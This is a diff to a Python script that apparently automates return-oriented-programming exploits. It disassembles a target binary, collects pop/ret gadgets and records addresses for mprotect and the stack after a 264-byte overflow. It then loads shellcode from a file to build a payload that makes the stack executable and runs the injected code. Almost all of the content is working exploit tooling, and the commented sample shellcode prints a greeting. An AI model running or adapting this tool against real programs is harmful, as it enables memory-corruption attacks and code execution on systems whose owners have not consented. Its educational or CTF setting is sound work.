@@ -13,7 +13,6 @@ filename = input("Input path of binary:")
 '''
 base of binary: 0x555555554000
 address of mprotect: 0x7ffff7affc00
-start of buffer: 0x7fffffffdf90
 start of payload (264 A's included): 0x7fffffffe098
 base of stack: 0x7fffffffe0b0
 '''
@@ -64,15 +63,15 @@ while gadgetIndex < len(disas):
         if ((disas[gadgetIndex][1] == 'ret') and getOneRet):
                 gadgets.append((disas[gadgetIndex],))
                 getOneRet = False
-        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret'):
+        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret') and (disas[gadgetIndex+1][2] == ''):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
-        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret')):
+        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret') and (disas[gadgetIndex+2][2] == ''):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2]))
-        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret')):
+        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret') and (disas[gadgetIndex+3][2] == ''):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3]))
-        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret')):
+        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret') and (disas[gadgetIndex+4][2] == ''):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4]))
-        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret')):
+        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret') and (disas[gadgetIndex+5][2] == ''):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4],disas[gadgetIndex+5]))
 
 
@@ -138,34 +137,11 @@ fileForShellcode = input("Input path of file for shellcode input: ")
 shellcodeFile = open(fileForShellcode,'r')
 shellcodeTemp = shellcodeFile.read()
 
-#shellcodeBytes = bytes(shellcodeTemp, 'latin1')
-
-#print(shellcodeTemp)
-#shellcodeBytes = shellcodeTemp.encode(encoding='latin1')
-#print(shellcodeBytes)
-
-#shellcodeBytes=shellcodeBytes.replace(b'\\x' , b'' )
-#shellcodeBytes=shellcodeBytes[2:-2]
-#shellcodeBytes = b'0x' + shellcodeBytes
-#print(shellcodeBytes)
-#print(type(shellcodeBytes))
-#print(addressOfMprotect)
-#encoded_scbytes = shellcodeBytes.encode()
-#sh_byte_array = bytearray(shellcodeBytes)
-#print(sh_byte_array)
-#shellcode = shellcodeBytes
 
 b = shellcodeTemp
-print(b)
 c = bytearray(b, encoding='latin1')
-print(c)
-print(type(c))
 shellcode = c.decode('unicode-escape').encode('ISO-8859-1')
 shellcode = shellcode[:-2]
-print(shellcode)
-print(type(shellcode))
-#shellcode = encode(shellcodeString.encode().decode('unicode_escape'), "raw_unicode_escape")
-#print(shellcode)
 #shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
 
 faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
